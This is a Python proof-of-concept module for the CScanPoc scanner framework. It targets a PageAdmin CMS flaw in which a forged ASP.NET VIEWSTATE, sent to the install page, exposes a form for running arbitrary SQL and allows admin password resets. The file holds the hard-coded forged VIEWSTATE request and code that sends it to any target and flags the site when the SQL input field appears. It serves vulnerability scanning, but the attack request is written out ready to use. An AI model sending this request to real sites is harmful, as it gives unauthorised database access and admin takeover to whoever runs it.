# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'PageAdmin_0000'  # 平台漏洞编号，留空
    name = 'PageAdmin可“伪造”VIEWSTATE从而执行任意SQL查询、可随意重置管理员密码'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-08-16'  # 漏洞公布时间
    desc = '''
        PageAdmins网站管理系统采用Div+Css标准化设计，符合W3C标准。兼容主流浏览器，网站系统可免费下载、免费使用、无使用时间与任何功能限制。主要用于公司企业网站、学校类和信息类网站搭建。
        PageAdmin可“伪造”VIEWSTATE从而执行任意SQL查询、可随意重置管理员密码
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=061699'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PageAdmin'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9941492d-69b8-464d-9bb7-b8436994ccad'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg+"/e/install/index.aspx?__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTExODcwMDU5OTgPZBYCAgEPZBYCAgMPFgIeB1Zpc2libGVoZGQ%3D&ctl02=%E8%BF%90%E8%A1%8CSQL"
            code, head, res, errcode, _ = hh.http(url)
            if code == 200 and "Tb_sql" in res and 'WebForm_DoPostBackWithOptions' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
